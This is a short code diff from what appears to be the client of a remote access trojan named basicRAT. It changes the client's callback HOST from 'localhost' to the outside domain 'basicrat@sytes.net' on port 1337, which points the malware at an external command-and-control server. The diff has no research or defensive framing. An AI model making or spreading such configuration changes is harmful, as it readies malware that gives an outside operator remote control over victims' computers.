@@ -13,7 +13,7 @@ from core import *
 
 
 # change these to suit your needs
-HOST = 'localhost'
+HOST = 'basicrat@sytes.net'
 PORT = 1337
 
 # seconds to wait before client will attempt to reconnect
